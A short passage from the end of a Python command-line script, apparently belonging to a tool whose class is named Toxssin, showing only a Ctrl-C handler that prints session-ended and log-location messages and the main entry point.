			#readline.clear_history()
			
	except KeyboardInterrupt:
		print(f'\n[{get_dt_prefix()[1]}] [{WARN}] {BOLD}Session terminated by user{END}.')
		print(f'[{get_dt_prefix()[1]}] [{WARN}] {BOLD}Logs are saved in {Toxssin.logs_dir}{END}')
		sys.exit(0)


if __name__ == '__main__':
	main()
